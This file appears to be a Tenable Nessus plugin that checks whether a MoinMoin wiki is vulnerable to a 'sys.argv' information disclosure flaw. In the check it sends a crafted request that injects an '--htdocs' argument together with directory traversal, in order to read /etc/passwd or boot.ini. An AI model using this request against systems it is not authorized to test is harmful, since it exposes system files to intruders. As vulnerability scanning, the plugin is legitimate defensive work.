#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44383);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2014/08/09 00:11:23 $");

  script_bugtraq_id(37853);
  script_osvdb_id(61831);
  script_xref(name:"Secunia", value:"38242");

  script_name(english:"MoinMoin 'sys.argv' Information Disclosure");
  script_summary(english:"Tries to retrieve a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A wiki application on the remote web server has an information
disclosure vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of MoinMoin running on the remote host has an information
disclosure vulnerability.  Using a specially crafted request, an
unauthenticated, remote attacker can specify the directory that the
application uses for its static pages and read arbitrary files from
that directory, subject to the privileges under which the application
runs.

Note that successful exploitation requires MoinMoin's 'FCGI_FORCE_CGI'
setting to be enabled."
  );
  script_set_attribute(attribute:"see_also", value:"http://moinmo.in/MoinMoinChat/Logs/moin-dev/2010-01-18");
  script_set_attribute(
    attribute:"see_also",
    value:"http://hg.moinmo.in/moin/1.9/rev/9d8e7ce3c3a2"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://moinmo.in/SecurityFixes"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to MoinMoin 1.9.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/01/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/01/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moinmo:moinmoin");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("moinmoin_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/moinmoin");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'moinmoin', port:port);
if (isnull(install))
  exit(1, "No MoinMoin installs on port "+port+" were found in the KB.");

url = install['dir']+'/';
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# First figure out the name of the static page directory
pattern = '<script type="text/javascript" src="(/[^/]+)/common/js/common.js">';
match = eregmatch(string:res[2], pattern:pattern);
if (match)
  static_dir = match[1];
else
  exit(1, "Unable to extract static page dir from "+build_url(qs:url, port:port)+".");

os = get_kb_item("Host/OS");
if (!os || 'Windows' >< os)
{
  # we'll do a dir traversal instead of providing an absolute path, which would
  # require specifying a drive letter
  dir['win'] = '../../../../../../../../../../../../../../../';
  file['win'] = 'boot.ini';
  pat['win'] = '\\[boot loader\\]';
}
if (!os || 'Windows' >!< os)
{
  dir['unix'] = '/etc';
  file['unix'] = 'passwd';
  pat['unix'] = 'root:.*:0:[01]:';
}

# Then try to get a file outside the web root
foreach os (keys(dir))
{
  url = install['dir']+static_dir+'/'+file[os]+'?--htdocs+'+dir[os];
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

  if (!isnull(res[2]) && egrep(pattern:pat[os], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      trailer = NULL;

      if (report_verbosity > 1)
      {
        trailer =
          crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n'+
          res[2]+'\n'+
          crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';
      }

      report = get_vuln_report(items:url, port:port, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}

full_url = build_url(qs:install['dir'] + '/', port:port);
exit(0, 'The MoinMoin install at '+full_url+' is not affected.');
